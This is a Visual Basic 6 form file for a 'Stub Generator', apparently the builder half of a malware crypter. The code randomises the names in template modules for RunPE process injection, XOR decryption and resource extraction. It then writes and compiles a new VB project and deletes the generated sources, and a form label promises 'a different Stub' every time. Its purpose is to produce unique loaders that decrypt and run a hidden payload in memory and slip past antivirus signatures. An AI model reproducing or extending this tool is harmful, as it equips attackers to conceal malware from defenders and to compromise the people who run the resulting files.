VERSION 5.00
Begin VB.Form Form2 
   BorderStyle     =   1  'Fest Einfach
   Caption         =   "Stub Generator"
   ClientHeight    =   3330
   ClientLeft      =   45
   ClientTop       =   345
   ClientWidth     =   5970
   BeginProperty Font 
      Name            =   "Verdana"
      Size            =   8.25
      Charset         =   0
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   LinkTopic       =   "Form2"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   3330
   ScaleWidth      =   5970
   StartUpPosition =   3  'Windows-Standard
   Begin VB.HScrollBar HScroll 
      Height          =   255
      Left            =   5520
      Max             =   3500
      TabIndex        =   18
      Top             =   2280
      Width           =   375
   End
   Begin VB.Frame Frame 
      Height          =   2055
      Left            =   120
      TabIndex        =   12
      Top             =   1200
      Width           =   4095
      Begin VB.OptionButton OptionNative 
         Caption         =   "Compile in Native (No Optimation)"
         Height          =   495
         Left            =   120
         TabIndex        =   16
         Top             =   1440
         Width           =   2415
      End
      Begin VB.OptionButton OptionNativeSize 
         Caption         =   "Compile in Native (Size Optimation)"
         Height          =   495
         Left            =   120
         TabIndex        =   15
         Top             =   960
         Width           =   2895
      End
      Begin VB.OptionButton OptionNativeSpeed 
         Caption         =   "Compile in Native (Speed Optimation)"
         Height          =   495
         Left            =   120
         TabIndex        =   14
         Top             =   480
         Width           =   2895
      End
      Begin VB.OptionButton OptionPcode 
         Caption         =   "Compile in P-Code"
         Height          =   375
         Left            =   120
         TabIndex        =   13
         Top             =   120
         Width           =   2775
      End
   End
   Begin VB.TextBox txtMainSubNativea 
      Height          =   285
      Left            =   6960
      MultiLine       =   -1  'True
      ScrollBars      =   3  'Beides
      TabIndex        =   11
      Text            =   "Form2.frx":0000
      Top             =   2280
      Visible         =   0   'False
      Width           =   255
   End
   Begin VB.TextBox txtResourceNativea 
      Height          =   285
      Left            =   6960
      MultiLine       =   -1  'True
      ScrollBars      =   3  'Beides
      TabIndex        =   10
      Text            =   "Form2.frx":01E4
      Top             =   1680
      Visible         =   0   'False
      Width           =   255
   End
   Begin VB.TextBox RndMainSubtxt 
      Height          =   285
      Left            =   7560
      MultiLine       =   -1  'True
      ScrollBars      =   3  'Beides
      TabIndex        =   9
      Top             =   720
      Visible         =   0   'False
      Width           =   300
   End
   Begin VB.TextBox txtMainSub 
      Height          =   285
      Left            =   6960
      MultiLine       =   -1  'True
      ScrollBars      =   3  'Beides
      TabIndex        =   8
      Text            =   "Form2.frx":12BC
      Top             =   1920
      Visible         =   0   'False
      Width           =   255
   End
   Begin VB.TextBox RndResourcetxt 
      Height          =   285
      Left            =   7560
      MultiLine       =   -1  'True
      ScrollBars      =   3  'Beides
      TabIndex        =   7
      Top             =   1080
      Visible         =   0   'False
      Width           =   300
   End
   Begin VB.TextBox txtResource 
      Height          =   285
      Left            =   6960
      MultiLine       =   -1  'True
      ScrollBars      =   3  'Beides
      TabIndex        =   6
      Text            =   "Form2.frx":147D
      Top             =   1320
      Visible         =   0   'False
      Width           =   300
   End
   Begin VB.TextBox RndEncryptiontxt 
      Height          =   285
      Left            =   7560
      MultiLine       =   -1  'True
      ScrollBars      =   3  'Beides
      TabIndex        =   5
      Top             =   1440
      Visible         =   0   'False
      Width           =   300
   End
   Begin VB.TextBox txtEncryption 
      Height          =   285
      Left            =   6960
      MultiLine       =   -1  'True
      ScrollBars      =   3  'Beides
      TabIndex        =   4
      Text            =   "Form2.frx":22C0
      Top             =   960
      Visible         =   0   'False
      Width           =   255
   End
   Begin VB.TextBox RndRuntimetxt 
      Height          =   285
      Left            =   7560
      MultiLine       =   -1  'True
      ScrollBars      =   3  'Beides
      TabIndex        =   3
      Top             =   1800
      Visible         =   0   'False
      Width           =   300
   End
   Begin VB.TextBox RndText 
      Height          =   285
      Left            =   4320
      Locked          =   -1  'True
      TabIndex        =   2
      Text            =   "1"
      Top             =   2280
      Width           =   1095
   End
   Begin VB.CommandButton Command 
      Caption         =   "Build"
      Height          =   495
      Left            =   4320
      TabIndex        =   1
      Top             =   2760
      Width           =   1575
   End
   Begin VB.TextBox txtRuntime 
      Height          =   285
      Left            =   6960
      MultiLine       =   -1  'True
      ScrollBars      =   3  'Beides
      TabIndex        =   0
      Text            =   "Form2.frx":24F9
      Top             =   600
      Visible         =   0   'False
      Width           =   300
   End
   Begin VB.Label Label 
      AutoSize        =   -1  'True
      Caption         =   "Rnd Key Length:"
      Height          =   195
      Index           =   1
      Left            =   4320
      TabIndex        =   19
      Top             =   1920
      Width           =   1425
   End
   Begin VB.Label Label 
      Caption         =   "Everytime  a different Stub !"
      Height          =   555
      Index           =   0
      Left            =   4320
      TabIndex        =   17
      Top             =   1320
      Width           =   1545
   End
   Begin VB.Image Image 
      Height          =   1200
      Left            =   0
      Picture         =   "Form2.frx":3AB6
      Top             =   0
      Width           =   6000
   End
End
Attribute VB_Name = "Form2"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
'Runtime Module
Private FuncNames As String
Private VarNames As String
Private ConstNames As String
Private FuncDeclareNames As String
Private sGen As String
Private sGen2 As String
Private sGen3 As String
Private sGen4 As String
'Resource Module
Private FuncResNames As String
Private SecondMainFunctionNames As String
Private RsourceTextNative As String
Private sGen9 As String
Private sGen7 As String
Private sGen5 As String
'Encryption Module
Private EncryptionNames As String
Private sGen6 As String
'Main Module
Private MainSubNames As String
Private sGen8 As String
'Runtime Module
Dim ret As String
'Encryption Module
Dim EnText As String
'Resource Module
Dim ResText As String
'Main Module
Dim MainText As String

Private Sub Command_Click()
'Runtime Module
FuncNames = "LongToByte" + "%" + "PutBytes" + "%" + "Invoke" + "%" + "GetNumb" + "%" + "RunPE"
VarNames = "lLong" + "%" + "bReturn" + "%" + "iLongToByte" + "%" + "bByte" + "%" + "iCounter" + "%" + "iPutBytes" + "%" + "sDLL" + "%" + "hHash" + "%" + "vParams" + "%" + "lPtr" + "%" + "lSize" + "%" + "bvBuff" + "%" + "sHost" + "%" + "sParams" + "%" + "hProcess"
ConstNames = "bInitialized_Inv" + "%" + "ASM_gAPIPTR" + "%" + "ASM_cCODE" + "%" + "kernel32" + "%" + "NTDLL"
FuncDeclareNames = "vItem" + "%" + "bTmp" + "%" + "lAPI" + "%" + "iInvoke" + "%" + "winvoke" + "%" + "hModuleBase" + "%" + "hPE" + "%" + "hSec" + "%" + "ImageBase" + "%" + "iRuntimeFunction" + "%" + "tSTARTUPINFO" + "%" + "tPROCESS_INFORMATION" + "%" + "tCONTEXT"

'Encryption Module
EncryptionNames = "XORDecryption" + "%" + "DataIn" + "%" + "CodeKey" + "%" + "lonDataPtr" + "%" + "strDataOut" + "%" + "intXOrValue1" + "%" + "intXOrValue2"

'Resource Module
FuncResNames = "ResType" + "%" + "GetResDataBytes" + "%" + "ResName" + "%" + "tmp1" + "%" + "tmp2" + "%" + "tmp3" + "%" + "tmp4" + "%" + "tmp5" + "%" + "tmp6"
SecondMainFunctionNames = "MSLIB" + "%" + "bvASM" + "%" + "CVoke" + "%" + "sLibName" + "%" + "sProcName" + "%" + "vParams" + "%" + "hMod" + "%" + "xS1x" + "%" + "xS2x" + "%" + "icvoke" + "%" + "icvokeCount" + "%" + "GetPointer" + "%" + "sLib" + "%" + "GetsProc" + "%" + "PointertAPI" + "%" + "bvLib" + "%" + "bvMod" + "%" + "AddCall" + "%" + "lpPtrCall" + "%" + "iCount" + "%" + "AddPush" + "%" + "lLong" + "%" + "iCount" + "%" + "AddLong" + "%" + "lLong" + "%" + "iCount" + "%" + "tDL" + "%" + "tBL" + "%" + "AddByte" + "%" + "bByte" + "%" + "iCount" + "%" + "CallPtr" + "%" + "sFindResourceA" + "%" + "sLoadResource" + "%" + "sLockResource" + "%" + "sSizeofResource" + "%" + "sFreeResource" + "%" + "sFreeLibrary" + "%" + "sKernelLib" + "%" + "sRtlMoveMemory"
RsourceTextNative = "DeCompress" + "%" + "xdatax" + "%" + "xbTempx" + "%" + "lBufferSize" + "%" + "sNtDllLib" + "%" + "sRtlDecompressBuffer"

'Main Module
MainSubNames = "bFile" + "%" + "lBitmap" + "%" + "bTemp"

Call ExtractTlbs
Call InitEngine

ret = txtRuntime.Text
EnText = txtEncryption.Text
If Form1.Check1.Value = 1 Then
ResText = txtResourceNativea.Text
MainText = txtMainSubNativea.Text
Else
ResText = txtResource.Text
MainText = txtMainSub.Text
End If

ret = EncryptCode(ret, FuncNames, sGen)
ret = EncryptCode(ret, VarNames, sGen2)
ret = EncryptCode(ret, ConstNames, sGen3)
ret = EncryptCode(ret, FuncDeclareNames, sGen4)
If Form1.Check1.Value = 1 Then
ResText = EncryptCode(ResText, FuncResNames, sGen5)
ResText = EncryptCode(ResText, SecondMainFunctionNames, sGen7)
ResText = EncryptCode(ResText, RsourceTextNative, sGen9)
Else
ResText = EncryptCode(ResText, FuncResNames, sGen5)
ResText = EncryptCode(ResText, SecondMainFunctionNames, sGen7)
End If
EnText = EncryptCode(EnText, EncryptionNames, sGen6)
MainText = EncryptCode(MainText, MainSubNames, sGen8)

RndRuntimetxt.Text = ret
RndEncryptiontxt.Text = EnText
RndResourcetxt.Text = ResText
RndMainSubtxt.Text = MainText

Call MainInit
Call MakeFiles
Call MakeME
Call KillMyScr
MsgBox "Finish!", vbInformation, "Info"
End Sub

Public Function InitEngine()
Dim i As Integer
Dim b() As String
'Runtime Module
b = Split(FuncNames, "%")
    For i = 0 To UBound(b)
    sGen = sGen & RndNames & "%"
    Next i

b = Split(VarNames, "%")
    For i = 0 To UBound(b)
    sGen2 = sGen2 & RndNames & "%"
    Next i
    
b = Split(ConstNames, "%")
    For i = 0 To UBound(b)
    sGen3 = sGen3 & RndNames & "%"
    Next i
    
b = Split(FuncDeclareNames, "%")
    For i = 0 To UBound(b)
    sGen4 = sGen4 & RndNames & "%"
    Next i
'Resource Module
b = Split(FuncResNames, "%")
    For i = 0 To UBound(b)
    sGen5 = sGen5 & RndNames & "%"
    Next i
b = Split(SecondMainFunctionNames, "%")
    For i = 0 To UBound(b)
    sGen7 = sGen7 & RndNames & "%"
    Next i
b = Split(RsourceTextNative, "%")
    For i = 0 To UBound(b)
    sGen9 = sGen9 & RndNames & "%"
    Next i
'Encryption Module
b = Split(EncryptionNames, "%")
    For i = 0 To UBound(b)
    sGen6 = sGen6 & RndNames & "%"
    Next i
'Main Module
b = Split(MainSubNames, "%")
    For i = 0 To UBound(b)
    sGen8 = sGen8 & RndNames & "%"
    Next i
End Function
Public Function MakeFiles()
Open App.Path & "\" & "LFile.vbp" For Binary As #1 'Projekt
Put #1, , "Type=Exe" & vbNewLine
Put #1, , "Reference=*\G{18122760-3434-4FA0-8BBC-81FF8C1D1010}#1.0#0#" & App.Path & "\" & "xCWPx_TLB.tlb#xCWPx" & vbNewLine
Put #1, , "Reference=*\G{1154A8AA-FB55-4134-BD8D-6B6DA38CEDB5}#1.0#0#" & App.Path & "\" & "HHZ_TLB.tlb#HHZzLib" & vbNewLine
Put #1, , "Module=Module1; M_Two.bas" & vbNewLine
Put #1, , "Module=Module2; M_Four.bas" & vbNewLine
Put #1, , "Module=Module3; M_One.bas" & vbNewLine
Put #1, , "Module=Module4; M_Three.bas" & vbNewLine
Put #1, , "Startup=""Sub Main" & vbNewLine
Put #1, , "HelpFile=""" & vbNewLine
Put #1, , "Command32=""" & vbNewLine
Put #1, , "Name=""Projekt1""" & vbNewLine
Put #1, , "HelpContextID=""0""" & vbNewLine
Put #1, , "CompatibleMode=""0""" & vbNewLine
Put #1, , "MajorVer=1" & vbNewLine
Put #1, , "MinorVer=0" & vbNewLine
Put #1, , "RevisionVer=0" & vbNewLine
Put #1, , "AutoIncrementVer=0" & vbNewLine
Put #1, , "ServerSupportFiles=0" & vbNewLine
If OptionPcode.Value = True Then
Put #1, , "CompilationType=1" & vbNewLine
Else
Put #1, , "CompilationType=0" & vbNewLine
End If
If OptionNativeSpeed.Value = True Then
Put #1, , "OptimizationType=0" & vbNewLine
End If
If OptionNativeSize.Value = True Then
Put #1, , "OptimizationType=1" & vbNewLine
End If
If OptionNative.Value = True Then
Put #1, , "OptimizationType=2" & vbNewLine
End If
Put #1, , "FavorPentiumPro(tm)=0" & vbNewLine
Put #1, , "CodeViewDebugInfo=0" & vbNewLine
Put #1, , "NoAliasing=0" & vbNewLine
Put #1, , "BoundsCheck=0" & vbNewLine
Put #1, , "OverflowCheck=0" & vbNewLine
Put #1, , "FlPointCheck=0" & vbNewLine
Put #1, , "FDIVCheck=0" & vbNewLine
Put #1, , "UnroundedFP=0" & vbNewLine
Put #1, , "StartMode=0" & vbNewLine
Put #1, , "Unattended=0" & vbNewLine
Put #1, , "Retained=0" & vbNewLine
Put #1, , "ThreadPerObject=0" & vbNewLine
Put #1, , "MaxNumberOfThreads=1" & vbNewLine
Close #1
Open App.Path & "\" & "M_One.bas" For Binary As #1 'Runtime
Put #1, , RndRuntimetxt.Text
Close #1
Open App.Path & "\" & "M_Two.bas" For Binary As #1 'Encryption
Put #1, , RndEncryptiontxt.Text
Close #1
Open App.Path & "\" & "M_Three.bas" For Binary As #1 'Resource
Put #1, , RndResourcetxt.Text
Close #1
Open App.Path & "\" & "M_Four.bas" For Binary As #1 'MainSub
Put #1, , RndMainSubtxt.Text
Close #1
End Function
Public Function EncryptCode(ByVal sText As String, ByVal ArrayString As String, ByVal RndArray As String) As String
Dim b() As String
Dim i As Integer
b = Split(ArrayString, "%")
Dim c() As String
c = Split(RndArray, "%")
EncryptCode = sText
For i = 0 To UBound(b)
    EncryptCode = Replace$(EncryptCode, b(i), c(i))
Next i
End Function
Public Function MainInit()
Dim MainSplit() As String

If Form1.Check1.Value = 1 Then
MainSplit() = Split(sGen9, "%")  '0 Decompress
RndMainSubtxt.Text = Replace$(RndMainSubtxt.Text, "DeCompress", MainSplit(0))
End If

RndMainSubtxt.Text = Replace$(RndMainSubtxt.Text, "bcp", Form1.RndEnKeytxt.Text) '"bcp"

MainSplit() = Split(sGen, "%")  '2 Invoke
RndResourcetxt.Text = Replace$(RndResourcetxt.Text, "Invoke", MainSplit(2))

MainSplit() = Split(sGen, "%")  '4 runpe
RndMainSubtxt.Text = Replace$(RndMainSubtxt.Text, "RunPE", MainSplit(4))

MainSplit() = Split(sGen5, "%") '1 Getresdatabytes
RndMainSubtxt.Text = Replace$(RndMainSubtxt.Text, "GetResDataBytes", MainSplit(1))

MainSplit() = Split(sGen7, "%")  '2 Cvoke 39 srtlmovememory 38 skernellib
RndMainSubtxt.Text = Replace$(RndMainSubtxt.Text, "sRtlMoveMemory", MainSplit(39))
RndMainSubtxt.Text = Replace$(RndMainSubtxt.Text, "sKernelLib", MainSplit(38))
RndMainSubtxt.Text = Replace$(RndMainSubtxt.Text, "CVoke", MainSplit(2))

MainSplit() = Split(sGen6, "%")  '0 XorDecryption
RndMainSubtxt.Text = Replace$(RndMainSubtxt.Text, "XORDecryption", MainSplit(0))
End Function
Public Function MakeME()
Shell App.Path & "\Compiler" & "\VB6.exe /m LFile.vbp"
End Function
Public Function KillMyScr()
Kill App.Path & "\" & "M_One.bas"
Kill App.Path & "\" & "M_Two.bas"
Kill App.Path & "\" & "M_Three.bas"
Kill App.Path & "\" & "M_Four.bas"
Kill App.Path & "\" & "LFile.vbp"
Kill App.Path & "\HHZ_TLB.tlb"
Kill App.Path & "\xCWPx_TLB.tlb"
End Function
Public Function ExtractTlbs()
Dim Z_TLBFILE() As Byte
Dim C_TLBFILE() As Byte
Z_TLBFILE() = LoadResData(101, "CUSTOM")
C_TLBFILE() = LoadResData(102, "CUSTOM")
Open App.Path & "\HHZ_TLB.tlb" For Binary As #1
Put #1, , Z_TLBFILE()
Close #1
Open App.Path & "\xCWPx_TLB.tlb" For Binary As #1
Put #1, , C_TLBFILE()
Close #1
End Function
Private Sub Form_Load()
OptionNativeSize.Value = True
End Sub

Private Sub HScroll_Change()
RndText.Text = CStr(HScroll.Value)
If RndText.Text = 51 Then HScroll.Value = 1
End Sub
